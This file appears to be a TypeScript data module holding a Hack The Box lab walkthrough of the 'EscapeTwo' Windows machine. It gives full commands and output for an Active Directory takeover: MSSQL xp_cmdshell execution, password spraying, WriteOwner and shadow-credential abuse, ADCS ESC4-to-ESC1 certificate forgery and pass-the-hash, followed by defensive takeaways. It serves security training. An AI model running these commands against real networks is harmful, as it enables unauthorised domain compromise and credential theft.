import type { WalkthroughDoc } from "./types";

export const escapetwo: WalkthroughDoc = {
  slug: "escapetwo",
  name: "EscapeTwo",
  platform: "Hack The Box",
  os: "Windows",
  difficulty: "Easy",
  retired: "May 2025",
  ip: "10.10.11.51",
  tags: [
    "Assumed Breach",
    "XLSX cred recovery",
    "MSSQL xp_cmdshell",
    "Password reuse",
    "BloodHound / WriteOwner",
    "Shadow Credentials",
    "ADCS ESC4 → ESC1",
    "Pass-the-Hash",
  ],
  lede: "An assumed-breach Active Directory chain: recover MSSQL credentials from a corrupt Excel workbook on an open SMB share, take the SQL Server via `xp_cmdshell`, loot a cleartext service password that's reused by a WinRM-capable user, then abuse a `WriteOwner` ACL and an ADCS ESC4→ESC1 certificate template to mint an Administrator certificate and pass-the-hash to Domain Admin.",
  summary: "Corrupt-XLSX cred recovery and MSSQL xp_cmdshell lead to a reused service password, then a WriteOwner ACL and ADCS ESC4→ESC1 certificate abuse to Domain Admin.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“The office looks quiet — until you read the spreadsheets.”" },
        { kind: "p", text: "**EscapeTwo** is an Easy-rated Windows machine set in the `sequel.htb` domain, and despite the rating it walks through a full, realistic Active Directory kill chain. It is an *assumed breach* box: Hack The Box hands us a low-privileged domain credential up front, so there is no foothold exploit to hunt for — the whole exercise is what a single set of stolen creds lets an attacker do once inside." },
        { kind: "p", text: "The path is a chain of small, believable misconfigurations: a credential-bearing business document on a readable share, a SQL Server we can turn into command execution, a service password left in cleartext and reused by a real user, and finally an over-permissive certificate authority. Each stage produces the exact material the next one needs." },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap AD sweep of `10.10.11.51`",
            "**assumed breach** — `rose:KxEPkKe6R8su`",
            "**SMB** — corrupt `accounts.xlsx` on *Accounting Department*",
            "**XLSX loot** — unzip → `sharedStrings.xml` → `sa` password",
            "**MSSQL** — `sa` login → enable `xp_cmdshell` → RCE as `sql_svc`",
            "**config loot** — `sql-Configuration.INI` → `sql_svc` password",
            "**password reuse** — spray → `ryan` → WinRM → `user.txt`",
            "**BloodHound** — `ryan` --WriteOwner--> `ca_svc`",
            "**shadow creds** — `bloodyAD` + `certipy shadow` → `ca_svc` hash",
            "**ADCS** — `DunderMifflinAuthentication` is ESC4",
            "**ESC4 → ESC1** — rewrite template → request `administrator.pfx`",
            "**PtH** — `certipy auth` → Administrator hash → WinRM → `root.txt`",
          ],
        },
        { kind: "callout", variant: "note", title: "Theme & context", text: "The domain is `sequel.htb` (a nod to *SQL*), and the ADCS template is named `DunderMifflinAuthentication` — an *Office* joke that fits the corporate-paperwork motif. It is the successor to the original *Escape* box: same ADCS-flavoured finish, different route in." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "A full TCP scan followed by a targeted version scan paints an unmistakable Active Directory Domain Controller — Kerberos, LDAP, SMB, the global-catalog ports and WinRM — with one non-standard extra: **Microsoft SQL Server** on `1433`. That MSSQL service, plus WinRM on `5985`, shapes the entire path." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -p- --min-rate 10000 10.10.11.51",
            "$ nmap -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389 -sCV 10.10.11.51",
            "PORT     STATE SERVICE       VERSION",
            "53/tcp   open  domain        Simple DNS Plus",
            "88/tcp   open  kerberos-sec  Microsoft Windows Kerberos",
            "135/tcp  open  msrpc         Microsoft Windows RPC",
            "139/tcp  open  netbios-ssn",
            "389/tcp  open  ldap          Domain: sequel.htb, Site: Default-First-Site-Name",
            "445/tcp  open  microsoft-ds",
            "636/tcp  open  ldaps",
            "1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000",
            "3268/tcp open  ldap          Global Catalog",
            "5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)",
          ],
          highlight: [10, 12],
        },
        { kind: "p", text: "LDAP and DNS give us the domain `sequel.htb` and the DC hostname `DC01`. Before touching Kerberos or certificate services we pin the names in `/etc/hosts` — PKINIT and `certipy` are fussy about resolution and will fail cryptically without it." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ echo '10.10.11.51 sequel.htb dc01.sequel.htb DC01' | sudo tee -a /etc/hosts",
          ],
        },
        { kind: "callout", variant: "note", title: "Assumed breach", text: "This is an assumed-breach scenario — HTB provides a starting credential, `rose:KxEPkKe6R8su`. Don't waste time on an unauthenticated foothold exploit; the game begins from an already-valid domain user." },
      ],
    },
    {
      id: "smb",
      num: "02",
      title: "SMB enumeration as rose",
      blocks: [
        { kind: "p", text: "Armed with `rose:KxEPkKe6R8su`, we enumerate SMB shares. Past the defaults there is a non-standard **Accounting Department** share that `rose` can read — exactly the kind of business file store where credentials leak." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares",
            "SMB   10.10.11.51  445  DC01  Share           Permissions   Remark",
            "SMB   10.10.11.51  445  DC01  -----           -----------   ------",
            "SMB   10.10.11.51  445  DC01  Accounting Department  READ",
            "SMB   10.10.11.51  445  DC01  SYSVOL          READ          Logon server share",
            "SMB   10.10.11.51  445  DC01  NETLOGON        READ          Logon server share",
          ],
          highlight: [3],
        },
        { kind: "p", text: "We pull the contents of the share. The folder holds a couple of accounting spreadsheets — including `accounts.xlsx`, which flatly refuses to open in LibreOffice." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ smbclient -U 'sequel.htb/rose%KxEPkKe6R8su' //10.10.11.51/'Accounting Department'",
            "smb: \\> ls",
            "  accounts.xlsx          A    ...",
            "  accounting_2024.xlsx   A    ...",
            "smb: \\> mget accounts.xlsx accounting_2024.xlsx",
          ],
        },
        { kind: "p", text: "While we're authenticated, a RID brute gives us the domain's user list — useful ammunition for the password spraying that comes later." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --rid-brute | grep SidTypeUser",
            "# Administrator, Guest, krbtgt, michael, ryan, oscar, sql_svc, rose, ca_svc",
          ],
        },
        { kind: "callout", variant: "warn", title: "Two gotchas on the share", text: "The share name contains a space — quote it (`'Accounting Department'`) or the connection fails. And `accounts.xlsx` will not open in a normal viewer: it is *deliberately corrupted*, which is the intended puzzle, not a broken download. Don't try to repair it." },
      ],
    },
    {
      id: "xlsx",
      num: "03",
      title: "Cracking the corrupt XLSX open",
      blocks: [
        { kind: "p", text: "An `.xlsx` file is really just a ZIP archive of XML parts. Because the workbook is corrupt we can't open it the intended way — but nothing stops us treating it as the ZIP it actually is and reading the raw XML underneath. All cell text in a modern spreadsheet lives in the *shared-string table* at `xl/sharedStrings.xml`." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ mkdir accounts && cd accounts",
            "$ unzip ../accounts.xlsx",
            "  inflating: xl/sharedStrings.xml",
            "  inflating: xl/workbook.xml",
            "  ...",
            "$ cat xl/sharedStrings.xml | sed 's/<[^>]*>/\\n/g' | grep -iE 'sa|sql|@|pass'",
            "sa",
            "MSSQLP@ssw0rd!",
          ],
          highlight: [7, 8],
        },
        { kind: "p", text: "The string table lays out a plaintext table of account names and passwords for the *accounts* sheet. Several rows are decoys for other systems, but one pair is load-bearing: the **MSSQL `sa`** password. To be sure which recovered strings are valid where, we spray them all with `nxc` against SMB, MSSQL and WinRM — and `sa` lights up on the SQL Server." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth",
            "MSSQL  10.10.11.51  1433  DC01  [+] sa:MSSQLP@ssw0rd! (Pwn3d!)",
          ],
          highlight: [1],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "MSSQL sysadmin credential `sa : MSSQLP@ssw0rd!`, pulled straight out of `xl/sharedStrings.xml`. Spray the rest of the sheet's rows too — but this is the one that opens the door." },
      ],
    },
    {
      id: "mssql",
      num: "04",
      title: "MSSQL access & RCE via xp_cmdshell",
      blocks: [
        { kind: "p", text: "The `sa` account is SQL Server's built-in sysadmin. We log in with impacket's `mssqlclient.py` and reach for `xp_cmdshell`, the extended stored procedure that shells out to the OS. It is disabled by default, so we enable it — which first requires turning on *show advanced options* or the `RECONFIGURE` fails." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ mssqlclient.py sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51",
            "SQL (sa  dbo@master)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
            "SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
            "SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami';",
            "output",
            "-----------------",
            "sequel\\sql_svc",
          ],
          highlight: [6],
        },
        { kind: "p", text: "The SQL Server service runs as the domain account `sql_svc`, so our commands execute in that context. That is the foothold on the box — but `sql_svc` is a service account, not an interactive user, so we treat `xp_cmdshell` as a looting tool rather than trying to live in it. (impacket's `enable_xp_cmdshell` helper toggles both switches in one shot if you'd rather not type the `sp_configure` calls by hand.)" },
        { kind: "callout", variant: "warn", title: "xp_cmdshell is off by default", text: "You must enable `show advanced options` before `xp_cmdshell`, or `RECONFIGURE` throws. And remember what you've got: command execution as a low-privilege service account, not a shell you want to persist in. Use it to find real credentials." },
      ],
    },
    {
      id: "pivot-ryan",
      num: "05",
      title: "Loot the SQL config → pivot to ryan",
      blocks: [
        { kind: "p", text: "SQL Server's unattended install writes the service-account password into a configuration INI in cleartext and — classically — nobody scrubs it afterwards. We read it through `xp_cmdshell`." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "SQL (sa  dbo@master)> EXEC xp_cmdshell 'type C:\\SQL2019\\ExpressAdv_ENU\\sql-Configuration.INI';",
            "output",
            "-----------------",
            "SQLSVCACCOUNT=\"SEQUEL\\sql_svc\"",
            "SQLSVCPASSWORD=\"WqSZAF6CysDQbGb3\"",
            "SQLSYSADMINACCOUNTS=\"SEQUEL\\Administrator\"",
          ],
          highlight: [4],
        },
        { kind: "p", text: "That gives us `sql_svc`'s cleartext password. But a service password is only worth what it unlocks — and here the real prize is *reuse*. We spray it across the domain user list and it lands on a human account, `ryan`, who happens to be a member of *Remote Management Users*." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nxc smb 10.10.11.51 -u users.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success",
            "SMB  10.10.11.51  445  DC01  [+] sequel.htb\\ryan:WqSZAF6CysDQbGb3",
            "$ nxc winrm 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'",
            "WINRM  10.10.11.51  5985  DC01  [+] sequel.htb\\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)",
          ],
          highlight: [1, 3],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "`SEQUEL\\sql_svc : WqSZAF6CysDQbGb3` from `sql-Configuration.INI` — and the same password is **reused** by `ryan`, who can WinRM. That reuse is the whole pivot: it turns a service credential into an interactive foothold." },
      ],
    },
    {
      id: "user",
      num: "06",
      title: "user.txt",
      blocks: [
        { kind: "p", text: "`sql_svc` itself can't WinRM, but `ryan` can. We drop into an interactive shell with `evil-winrm` and grab the user flag." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'",
            "*Evil-WinRM* PS C:\\Users\\ryan\\Documents> type ..\\Desktop\\user.txt",
            "a1b2c3d4····························",
          ],
          highlight: [2],
        },
        { kind: "p", text: "`ryan` is an ordinary domain user — a solid foothold, but nowhere near Administrator. The way up is not on this filesystem; it's in the domain's access-control graph." },
      ],
    },
    {
      id: "bloodhound",
      num: "07",
      title: "BloodHound: ryan's WriteOwner over ca_svc",
      blocks: [
        { kind: "p", text: "We collect BloodHound data as `ryan` and look for outbound control edges. One stands out: `ryan` holds **WriteOwner** over the `ca_svc` account. Crucially, `ca_svc` is the ADCS service account and a member of the **Cert Publishers** group — so controlling it is a gateway into the certificate authority." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.10.11.51 -c All",
            "# Graph edge:  RYAN@SEQUEL.HTB  --WriteOwner-->  CA_SVC@SEQUEL.HTB",
            "# CA_SVC@SEQUEL.HTB  MemberOf  CERT PUBLISHERS@SEQUEL.HTB",
          ],
          highlight: [1, 2],
        },
        { kind: "p", text: "`WriteOwner` lets us make ourselves the *owner* of `ca_svc`. Ownership isn't the same as control, but an owner can rewrite the object's DACL — so the plan is a three-step ACL takeover: set owner → grant ourselves full control → obtain usable authentication material for the account." },
        { kind: "callout", variant: "warn", title: "WriteOwner is a chain, not a key", text: "`WriteOwner` alone can't act as `ca_svc`. You must chain it: take ownership, grant rights, then recover credentials. Prefer *shadow credentials* over resetting the password — a password change is noisy and can break the box for other players; shadow creds are quieter and revert cleanly." },
      ],
    },
    {
      id: "shadow",
      num: "08",
      title: "Abuse WriteOwner → Shadow Credentials → ca_svc hash",
      blocks: [
        { kind: "p", text: "We drive the ACL takeover with `bloodyAD`: make `ryan` the owner of `ca_svc`, then grant `ryan` `GenericAll` over it. With write access to the account we can touch its `msDS-KeyCredentialLink` attribute — the hook for a **Shadow Credentials** attack." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan",
            "[+] Old owner ... is now replaced by ryan on ca_svc",
            "$ bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3' add genericAll ca_svc ryan",
            "[+] ryan has now GenericAll on ca_svc",
          ],
        },
        { kind: "p", text: "Now `certipy shadow auto` does the whole flow end to end: it adds a device key to `ca_svc`, authenticates via PKINIT, and performs UnPAC-the-hash to recover the account's NT hash — then cleans up the key it added." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51",
            "[*] Adding Key Credential to 'ca_svc'",
            "[*] Authenticating as 'ca_svc' via PKINIT",
            "[*] Recovered NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce",
          ],
          highlight: [3],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "`ca_svc` NT hash `3b181b914e7a9d5508ea1e20bc2b7fce`, obtained via shadow credentials without ever changing the account's password." },
        { kind: "callout", variant: "warn", title: "Watch the clock", text: "Kerberos and PKINIT are time-sensitive. If `certipy` throws `KRB_AP_ERR_SKEW`, sync to the DC (`sudo ntpdate sequel.htb`, or wrap the call in `faketime`) before retrying." },
      ],
    },
    {
      id: "adcs-enum",
      num: "09",
      title: "ADCS enumeration: an ESC4 template",
      blocks: [
        { kind: "p", text: "With `ca_svc`'s hash we point `certipy find` at the CA to enumerate templates and flag vulnerable ones. The `DunderMifflinAuthentication` template comes back as **ESC4**: the *Cert Publishers* group — which `ca_svc` belongs to — has dangerous *write* permissions over the template object itself." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \\",
            "      -dc-ip 10.10.11.51 -vulnerable -stdout",
            "[*] Enumeration output:",
            "  CA Name   : sequel-DC-CA",
            "  Template  : DunderMifflinAuthentication",
            "  [!] Vulnerabilities:",
            "      ESC4  : 'SEQUEL.HTB\\\\Cert Publishers' has dangerous permissions (write) over the template",
          ],
          highlight: [4, 6, 7],
        },
        { kind: "p", text: "ESC4 is not directly exploitable — it's a *permission* flaw over the template's configuration. But because we can rewrite that configuration, we can introduce the far more dangerous **ESC1**: a template that allows client authentication *and* lets the enrollee supply an arbitrary subject. That combination lets us request a certificate for any user in the domain." },
        { kind: "callout", variant: "note", title: "ESC4 is the enabler", text: "Think of ESC4 as the write primitive you convert into ESC1. Confirm with `-vulnerable -stdout` that `ca_svc`'s group genuinely holds the write ACE before touching the template — you're about to modify a shared object." },
      ],
    },
    {
      id: "esc1",
      num: "10",
      title: "Convert ESC4 → ESC1, request an Administrator cert",
      blocks: [
        { kind: "p", text: "Using `ca_svc`'s write permission we overwrite the template configuration so it becomes ESC1: a client-authentication EKU plus the `ENROLLEE_SUPPLIES_SUBJECT` flag. `certipy`'s `-write-default-configuration` sets exactly this permissive shape." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \\",
            "      -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -write-default-configuration",
            "[*] Successfully updated 'DunderMifflinAuthentication'   # now ESC1-vulnerable",
          ],
          highlight: [3],
        },
        { kind: "p", text: "Now we request a certificate from `sequel-DC-CA` on that template, but we supply our own subject via `-upn administrator@sequel.htb`. Because the template trusts the enrollee to name the subject, the CA happily issues a certificate whose identity is the domain Administrator." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \\",
            "      -ca sequel-DC-CA -target dc01.sequel.htb \\",
            "      -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip 10.10.11.51",
            "[*] Successfully requested certificate",
            "[*] Saved certificate and private key to 'administrator.pfx'",
          ],
          highlight: [5],
        },
        { kind: "callout", variant: "warn", title: "The SAN drives who you become", text: "`-upn administrator@sequel.htb` is what makes the certificate authenticate as Administrator — a typo yields a cert that authenticates as nobody useful. On some `certipy` versions you must pass `-target dc01.sequel.htb` explicitly so enrollment reaches the DC's CA. Note that overwriting a template is destructive on a shared box — record the original config." },
      ],
    },
    {
      id: "pth-root",
      num: "11",
      title: "Certificate auth → Administrator hash → Pass-the-Hash",
      blocks: [
        { kind: "p", text: "We authenticate with the Administrator PFX. `certipy auth` performs PKINIT and UnPAC-the-hash, handing us the Administrator NT hash — no password required." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51",
            "[*] Using principal: administrator@sequel.htb",
            "[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff",
          ],
          highlight: [3],
        },
        { kind: "p", text: "Administrator is Domain Admin. We pass the NT half of the hash over WinRM and land a shell as the domain's top account." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff",
            "*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami",
            "sequel\\administrator",
          ],
          highlight: [3],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Administrator NT hash `7a8d4e04986afa8ed4060f75e5a0b3ff` (full pair `aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff`, the LM half is the blank placeholder). Feed only the NT half to `evil-winrm -H`." },
      ],
    },
    {
      id: "root",
      num: "12",
      title: "root.txt",
      blocks: [
        {
          kind: "code",
          lang: "bash",
          lines: [
            "*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> type ..\\Desktop\\root.txt",
            "9f8e7d6c····························",
          ],
          highlight: [1],
        },
        { kind: "p", text: "From a single assumed-breach credential to full domain compromise: a spreadsheet leaked the SQL password, the SQL box leaked a reused service password, a WinRM user carried a WriteOwner edge, and an over-permissive certificate template turned that edge into a Domain Admin certificate. Every link was a small, ordinary misconfiguration — stitched together, they own the domain." },
      ],
    },
    {
      id: "defense",
      num: "13",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Never leave cleartext credentials in files.** `accounts.xlsx` on an open share and the `sql-Configuration.INI` service password were the first two dominoes. Scrub install artifacts after setup, keep secrets in a vault, and treat business documents as potential credential stores when auditing share ACLs.",
            "**Restrict SMB share access.** Business documents holding credentials should never be world-readable to low-privilege users. Audit share permissions and least-privilege the *Accounting Department*-style shares.",
            "**Enforce unique passwords per account.** `ryan` reusing `sql_svc`'s password is what turned a service credential into an interactive foothold. Password-reuse detection and a no-reuse policy break this pivot.",
            "**Lock down MSSQL.** Run SQL Server least-privilege (ideally a gMSA, not a shared domain account), keep `xp_cmdshell` disabled by policy, alert on `sp_configure` changes, and never leave `sa` with a weak, shared password.",
            "**Tighten Active Directory ACLs.** The `ryan → WriteOwner → ca_svc` edge is an unnecessary dangerous permission. Audit with BloodHound, remove Write/WriteOwner/GenericAll grants over privileged and service accounts, and monitor `msDS-KeyCredentialLink` writes to catch shadow-credential attacks.",
            "**Harden ADCS.** Remove `ENROLLEE_SUPPLIES_SUBJECT` and overbroad EKUs, restrict who can write to certificate templates (ESC4), require CA-manager approval, and alert on certificate requests carrying an alternate UPN — the signature of an ESC1 impersonation.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "SMB enumeration · OOXML/XLSX internals & credential recovery · MSSQL `xp_cmdshell` RCE · config-file looting · password-reuse spraying · WinRM foothold · BloodHound ACL analysis · WriteOwner abuse · Shadow Credentials · ADCS ESC4→ESC1 certificate abuse · UnPAC-the-hash · Pass-the-Hash." },
      ],
    },
  ],
};
